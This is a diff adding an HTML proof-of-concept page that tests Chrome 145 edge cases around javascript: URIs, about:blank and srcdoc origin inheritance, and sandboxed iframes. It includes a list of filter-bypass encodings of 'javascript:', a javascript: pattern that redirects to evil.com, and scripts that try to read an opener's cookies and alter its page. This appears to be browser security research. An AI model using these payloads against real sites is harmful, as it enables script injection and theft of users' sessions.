@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: javascript: URI Edge Cases — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; max-height: 250px; overflow-y: auto; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+  iframe { border: 1px solid #555; }
+</style>
+</head>
+<body>
+<h1>PoC: javascript: URI & about:blank Inheritance</h1>
+<p class="warn">Target: Chrome 145 | Tests javascript: URI edge cases, about:blank origin inheritance, cross-origin access</p>
+<p class="warn">Related: CVE-2023-2722, CVE-2022-3045, CVE-2021-30554 (javascript URI / about:blank issues)</p>
+
+<h2>Test 1: javascript: URI in address bar behavior</h2>
+<div class="test-case">
+  <p>Checks how Chrome handles javascript: URIs pasted or navigated to from the address bar.</p>
+  <button onclick="test1()">Run Test</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: about:blank origin inheritance chain</h2>
+<div class="test-case">
+  <p>Tests how about:blank inherits origin from its opener/parent at various depths.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2"></pre>
+  <iframe id="t2frame" style="width:100%;height:120px;display:none;"></iframe>
+</div>
+
+<h2>Test 3: javascript: URI in iframe src</h2>
+<div class="test-case">
+  <p>Sets iframe src to javascript: URI and checks execution context and origin.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3"></pre>
+  <iframe id="t3frame" style="width:100%;height:80px;display:none;"></iframe>
+</div>
+
+<h2>Test 4: about:blank → document.write cross-origin test</h2>
+<div class="test-case">
+  <p>Opens about:blank, writes content, then tests if it can access the opener cross-origin.</p>
+  <button onclick="test4()">Run Test</button>
+  <pre id="t4"></pre>
+</div>
+
+<h2>Test 5: javascript: URI encoding bypass attempts</h2>
+<div class="test-case">
+  <p>Tests various encodings of "javascript:" to bypass URL filtering.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5"></pre>
+</div>
+
+<h2>Test 6: about:srcdoc origin behavior</h2>
+<div class="test-case">
+  <p>Tests origin of srcdoc iframes and their access to parent frame.</p>
+  <button onclick="test6()">Run Test</button>
+  <pre id="t6"></pre>
+  <iframe id="t6frame" style="width:100%;height:100px;display:none;"></iframe>
+</div>
+
+<h2>Test 7: Chained about:blank windows</h2>
+<div class="test-case">
+  <p>Creates a chain: page → about:blank → about:blank → ... and tests origin propagation.</p>
+  <button onclick="test7()">Run Test</button>
+  <pre id="t7"></pre>
+</div>
+
+<h2>Test 8: javascript: void(0) navigation and URL bar state</h2>
+<div class="test-case">
+  <p>Tests various javascript: void() patterns and their effect on URL bar and page state.</p>
+  <button onclick="test8()">Run Test</button>
+  <pre id="t8"></pre>
+</div>
+
+<h2>Test 9: about:blank with sandboxed iframe interaction</h2>
+<div class="test-case">
+  <p>Tests if sandboxed about:blank iframes have unexpected access to parent resources.</p>
+  <button onclick="test9()">Run Test</button>
+  <pre id="t9"></pre>
+  <iframe id="t9frame" sandbox="allow-scripts" style="width:100%;height:80px;display:none;"></iframe>
+</div>
+
+<script>
+function log(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent += msg + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+
+// Test 1: javascript: URI in address bar
+function test1() {
+  log('t1', '=== javascript: URI Handling Analysis ===');
+  log('t1', `Current origin: ${location.origin}`);
+  log('t1', '');
+
+  // Test if location.href can be set to javascript:
+  log('t1', '[1] Setting location.href to javascript: URI on about:blank...');
+  const w = window.open('about:blank');
+  if (w) {
+    try {
+      w.location.href = 'javascript:document.write("Executed via location.href")';
+      log('t1', '  location.href = javascript:... succeeded');
+      setTimeout(() => {
+        try {
+          log('t1', `  Window content: ${w.document.body.textContent}`);
+          log('t1', `  Window location: ${w.location.href}`);
+          log('t1', `  Window origin: ${w.location.origin}`);
+        } catch (e) {
+          log('t1', `  Cannot read window: ${e.message}`);
+        }
+        w.close();
+      }, 500);
+    } catch (e) {
+      log('t1', `  location.href = javascript: failed: ${e.message}`);
+      w.close();
+    }
+  } else {
+    log('t1', '  Popup blocked.');
+  }
+
+  // Test link with javascript: href
+  log('t1', '');
+  log('t1', '[2] Anchor element with javascript: href...');
+  const a = document.createElement('a');
+  a.href = 'javascript:void(document.title="hijacked")';
+  log('t1', `  a.href = ${a.href}`);
+  log('t1', `  a.protocol = ${a.protocol}`);
+  log('t1', `  a.origin = ${a.origin}`);
+
+  // Test URL constructor with javascript:
+  log('t1', '');
+  log('t1', '[3] URL constructor with javascript: ...');
+  try {
+    const u = new URL('javascript:alert(1)');
+    log('t1', `  URL parsed: protocol=${u.protocol} href=${u.href}`);
+  } catch (e) {
+    log('t1', `  URL constructor threw: ${e.message}`);
+  }
+}
+
+// Test 2: about:blank origin inheritance
+function test2() {
+  const frame = document.getElementById('t2frame');
+  frame.style.display = 'block';
+
+  log('t2', '=== about:blank Origin Inheritance ===');
+  log('t2', `Parent origin: ${location.origin}`);
+
+  // Direct about:blank iframe
+  frame.src = 'about:blank';
+  frame.addEventListener('load', function handler() {
+    frame.removeEventListener('load', handler);
+
+    try {
+      const fdoc = frame.contentDocument;
+      const fwin = frame.contentWindow;
+      log('t2', `iframe about:blank origin: ${fwin.location.origin}`);
+      log('t2', `iframe about:blank href: ${fwin.location.href}`);
+
+      // Can parent access iframe document?
+      try {
+        fdoc.body.innerHTML = '<p>Written by parent</p>';
+        log('t2', 'Parent can write to about:blank iframe: YES');
+      } catch (e) {
+        log('t2', `Parent cannot write: ${e.message}`);
+      }
+
+      // Can iframe access parent?
+      try {
+        fwin.eval(`
+          try {
+            parent.postMessage({type:'t2', msg:'iframe can access parent.location.origin: ' + parent.location.origin}, '*');
+          } catch(e) {
+            parent.postMessage({type:'t2', msg:'iframe cannot access parent: ' + e.message}, '*');
+          }
+        `);
+      } catch (e) {
+        log('t2', `Cannot eval in iframe: ${e.message}`);
+      }
+
+      // Create nested about:blank
+      try {
+        const inner = fdoc.createElement('iframe');
+        inner.src = 'about:blank';
+        fdoc.body.appendChild(inner);
+        inner.addEventListener('load', () => {
+          try {
+            log('t2', `Nested about:blank origin: ${inner.contentWindow.location.origin}`);
+            log('t2', `Nested about:blank href: ${inner.contentWindow.location.href}`);
+          } catch (e) {
+            log('t2', `Cannot read nested iframe: ${e.message}`);
+          }
+        });
+      } catch (e) {
+        log('t2', `Nested iframe error: ${e.message}`);
+      }
+    } catch (e) {
+      log('t2', `Frame access error: ${e.message}`);
+    }
+  });
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't2') {
+      log('t2', `[postMessage] ${e.data.msg}`);
+    }
+  });
+}
+
+// Test 3: javascript: in iframe src
+function test3() {
+  const frame = document.getElementById('t3frame');
+  frame.style.display = 'block';
+
+  log('t3', '=== javascript: URI in iframe ===');
+
+  // Test 1: Direct javascript: src
+  try {
+    frame.src = "javascript:document.write('<h3>Executed in iframe</h3><p>Origin: '+location.origin+'</p>')";
+    log('t3', 'Set iframe src to javascript: URI');
+    setTimeout(() => {
+      try {
+        log('t3', `iframe location: ${frame.contentWindow.location.href}`);
+        log('t3', `iframe origin: ${frame.contentWindow.location.origin}`);
+        log('t3', `iframe content: ${frame.contentDocument.body.textContent}`);
+        log('t3', `Parent can read iframe: YES (same origin inheritance)`);
+      } catch (e) {
+        log('t3', `Cannot read iframe: ${e.message}`);
+      }
+    }, 500);
+  } catch (e) {
+    log('t3', `iframe javascript: src error: ${e.message}`);
+  }
+
+  // Test 2: javascript: with return value
+  setTimeout(() => {
+    try {
+      frame.src = 'javascript:"<h3>Returned HTML</h3>"';
+      log('t3', 'Set iframe src to javascript: with return value');
+      setTimeout(() => {
+        try {
+          log('t3', `Return value content: ${frame.contentDocument.body.textContent}`);
+        } catch (e) {
+          log('t3', `Cannot read: ${e.message}`);
+        }
+      }, 500);
+    } catch (e) {
+      log('t3', `Error: ${e.message}`);
+    }
+  }, 1000);
+}
+
+// Test 4: about:blank cross-origin probing
+function test4() {
+  log('t4', '=== about:blank Cross-Origin Access ===');
+
+  const w = window.open('about:blank', '_blank');
+  if (!w) {
+    log('t4', 'Popup blocked. Allow popups and retry.');
+    return;
+  }
+
+  // Write content to about:blank window
+  w.document.write(`<!DOCTYPE html><html><body>
+<h2>about:blank Window</h2>
+<pre id="log"></pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += 'Location: ' + location.href + '\\n';
+  l.textContent += 'Origin: ' + location.origin + '\\n';
+  
+  // Check opener access
+  if (window.opener) {
+    l.textContent += 'Has opener: YES\\n';
+    try {
+      l.textContent += 'Opener origin: ' + window.opener.location.origin + '\\n';
+      l.textContent += 'Opener href: ' + window.opener.location.href + '\\n';
+      l.textContent += 'Can read opener cookie: ' + window.opener.document.cookie + '\\n';
+      l.textContent += 'FINDING: Full opener access from about:blank!\\n';
+    } catch(e) {
+      l.textContent += 'Opener access blocked: ' + e.message + '\\n';
+    }
+    
+    // Try to modify opener
+    try {
+      window.opener.document.title = 'Modified by about:blank child';
+      l.textContent += 'Modified opener title: SUCCESS\\n';
+    } catch(e) {
+      l.textContent += 'Cannot modify opener: ' + e.message + '\\n';
+    }
+  }
+  
+  // Try fetch from about:blank context
+  try {
+    fetch(window.opener.location.origin + '/api/test')
+      .then(r => l.textContent += 'Fetch from about:blank succeeded: ' + r.status + '\\n')
+      .catch(e => l.textContent += 'Fetch failed: ' + e.message + '\\n');
+  } catch(e) {
+    l.textContent += 'Fetch setup error: ' + e.message + '\\n';
+  }
+<\/script>
+</body></html>`);
+  w.document.close();
+
+  log('t4', 'Opened about:blank with test script.');
+  log('t4', 'Check the new window for cross-origin access results.');
+
+  // Verify from opener side
+  setTimeout(() => {
+    try {
+      log('t4', `Can opener read child: title="${w.document.title}"`);
+      log('t4', `Child origin: ${w.location.origin}`);
+    } catch (e) {
+      log('t4', `Opener cannot read child: ${e.message}`);
+    }
+  }, 1000);
+}
+
+// Test 5: javascript: encoding bypass
+function test5() {
+  log('t5', '=== javascript: URI Encoding Bypass Tests ===');
+
+  const variants = [
+    { name: 'Standard', uri: 'javascript:1+1' },
+    { name: 'Mixed case', uri: 'JavaScript:1+1' },
+    { name: 'Upper case', uri: 'JAVASCRIPT:1+1' },
+    { name: 'Tab in protocol', uri: 'java\tscript:1+1' },
+    { name: 'Newline in protocol', uri: 'java\nscript:1+1' },
+    { name: 'CR in protocol', uri: 'java\rscript:1+1' },
+    { name: 'Null byte', uri: 'java\0script:1+1' },
+    { name: 'URL-encoded j', uri: '%6aavascript:1+1' },
+    { name: 'URL-encoded colon', uri: 'javascript%3a1+1' },
+    { name: 'HTML entity', uri: 'javascript&#58;1+1' },
+    { name: 'UTF-8 BOM prefix', uri: '\uFEFFjavascript:1+1' },
+    { name: 'Zero-width space', uri: 'java\u200Bscript:1+1' },
+    { name: 'Zero-width joiner', uri: 'java\u200Dscript:1+1' },
+    { name: 'Soft hyphen', uri: 'java\u00ADscript:1+1' },
+    { name: 'Data URI with js', uri: 'data:text/html,<script>alert(1)<\/script>' },
+  ];
+
+  for (const { name, uri } of variants) {
+    const a = document.createElement('a');
+    a.href = uri;
+    const normalized = a.href;
+    const isJavascript = a.protocol === 'javascript:';
+    log('t5', `${name}:`);
+    log('t5', `  Input: ${JSON.stringify(uri)}`);
+    log('t5', `  Normalized: ${normalized}`);
+    log('t5', `  Protocol: ${a.protocol}`);
+    log('t5', `  Is javascript: ${isJavascript}`);
+    log('t5', '');
+  }
+}
+
+// Test 6: srcdoc origin
+function test6() {
+  const frame = document.getElementById('t6frame');
+  frame.style.display = 'block';
+
+  frame.srcdoc = `<!DOCTYPE html><html><body style="font-family:monospace;font-size:11px;">
+<pre id="log">Analyzing srcdoc origin...</pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += '\\nLocation: ' + location.href;
+  l.textContent += '\\nOrigin: ' + location.origin;
+  l.textContent += '\\nProtocol: ' + location.protocol;
+  
+  // Test parent access
+  try {
+    l.textContent += '\\nParent origin: ' + parent.location.origin;
+    l.textContent += '\\nCan access parent: YES';
+  } catch(e) {
+    l.textContent += '\\nParent access: ' + e.message;
+  }
+  
+  // Test document.domain
+  try {
+    l.textContent += '\\ndocument.domain: ' + document.domain;
+  } catch(e) {
+    l.textContent += '\\ndocument.domain error: ' + e.message;
+  }
+  
+  // Post results
+  parent.postMessage({type:'t6', log: l.textContent}, '*');
+<\/script>
+</body></html>`;
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't6') {
+      log('t6', 'srcdoc iframe results:');
+      log('t6', e.data.log);
+    }
+  });
+}
+
+// Test 7: Chained about:blank
+function test7() {
+  log('t7', '=== Chained about:blank Origin Propagation ===');
+  log('t7', `Root origin: ${location.origin}`);
+
+  const w1 = window.open('about:blank');
+  if (!w1) { log('t7', 'Popup blocked.'); return; }
+
+  w1.document.write(`<html><body>
+<pre id="log">Window 1 (about:blank)</pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += '\\nW1 origin: ' + location.origin;
+  l.textContent += '\\nW1 href: ' + location.href;
+  
+  // Open another about:blank from this about:blank
+  const w2 = window.open('about:blank');
+  if (w2) {
+    w2.document.write('<html><body><pre id="log">Window 2</pre><script>' +
+      'var l2=document.getElementById("log");' +
+      'l2.textContent+="\\\\nW2 origin: "+location.origin;' +
+      'l2.textContent+="\\\\nW2 href: "+location.href;' +
+      'try{l2.textContent+="\\\\nW2 can read opener: "+window.opener.document.title;}' +
+      'catch(e){l2.textContent+="\\\\nW2 opener access: "+e.message;}' +
+      'try{l2.textContent+="\\\\nW2 can read root: "+window.opener.opener.document.title;}' +
+      'catch(e){l2.textContent+="\\\\nW2 root access: "+e.message;}' +
+      '<\\/script></body></html>');
+    w2.document.close();
+    l.textContent += '\\nOpened W2 from W1';
+    
+    // Report back
+    try {
+      window.opener.postMessage({type:'t7', msg: 'Chain: root→W1→W2 created. Check all windows.'}, '*');
+    } catch(e) {}
+  } else {
+    l.textContent += '\\nW2 popup blocked';
+  }
+<\/script>
+</body></html>`);
+  w1.document.close();
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't7') {
+      log('t7', e.data.msg);
+    }
+  });
+
+  log('t7', 'Opened chain. Check all windows for origin propagation.');
+}
+
+// Test 8: javascript:void() patterns
+function test8() {
+  log('t8', '=== javascript:void() Pattern Tests ===');
+
+  const patterns = [
+    'javascript:void(0)',
+    'javascript:void(0);',
+    'javascript:void(document.cookie)',
+    'javascript:void(document.location="https://evil.com")',
+    'javascript:undefined',
+    'javascript:null',
+    'javascript:""',
+    'javascript:0',
+    'javascript:false',
+    'javascript:void%200',
+    'javascript:/**/void(0)',
+  ];
+
+  const frame = document.createElement('iframe');
+  frame.style.display = 'none';
+  document.body.appendChild(frame);
+
+  for (const pattern of patterns) {
+    try {
+      frame.src = pattern;
+      log('t8', `"${pattern}" → accepted (no error)`);
+    } catch (e) {
+      log('t8', `"${pattern}" → rejected: ${e.message}`);
+    }
+  }
+
+  // Check URL bar behavior with javascript:void
+  setTimeout(() => {
+    try {
+      log('t8', `\nFrame location after javascript:void(0): ${frame.contentWindow.location.href}`);
+    } catch (e) {
+      log('t8', `Cannot read frame: ${e.message}`);
+    }
+    document.body.removeChild(frame);
+  }, 500);
+}
+
+// Test 9: Sandboxed about:blank
+function test9() {
+  const frame = document.getElementById('t9frame');
+  frame.style.display = 'block';
+
+  frame.srcdoc = `<!DOCTYPE html><html><body style="font-family:monospace;font-size:11px;">
+<pre id="log">Sandboxed about:blank analysis...</pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += '\\nOrigin: ' + location.origin;
+  l.textContent += '\\nHref: ' + location.href;
+  
+  // Test what sandboxed iframe can do
+  try {
+    l.textContent += '\\nCookies: ' + document.cookie;
+  } catch(e) {
+    l.textContent += '\\nCookie error: ' + e.message;
+  }
+  
+  try {
+    l.textContent += '\\nParent origin: ' + parent.location.origin;
+    l.textContent += '\\nWARNING: Sandboxed iframe can read parent origin!';
+  } catch(e) {
+    l.textContent += '\\nParent blocked: ' + e.message;
+  }
+  
+  // Test localStorage
+  try {
+    localStorage.setItem('test', '1');
+    l.textContent += '\\nlocalStorage: accessible';
+  } catch(e) {
+    l.textContent += '\\nlocalStorage: ' + e.message;
+  }
+  
+  // Test IndexedDB
+  try {
+    const req = indexedDB.open('test');
+    req.onsuccess = () => l.textContent += '\\nIndexedDB: accessible';
+    req.onerror = () => l.textContent += '\\nIndexedDB: blocked';
+  } catch(e) {
+    l.textContent += '\\nIndexedDB: ' + e.message;
+  }
+  
+  // Test fetch
+  try {
+    fetch('/').then(r => {
+      l.textContent += '\\nfetch /: status ' + r.status;
+    }).catch(e => {
+      l.textContent += '\\nfetch /: ' + e.message;
+    });
+  } catch(e) {
+    l.textContent += '\\nfetch error: ' + e.message;
+  }
+  
+  parent.postMessage({type:'t9', log: l.textContent}, '*');
+<\/script>
+</body></html>`;
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't9') {
+      log('t9', 'Sandboxed iframe results:');
+      log('t9', e.data.log);
+    }
+  });
+}
+</script>
+</body>
+</html>
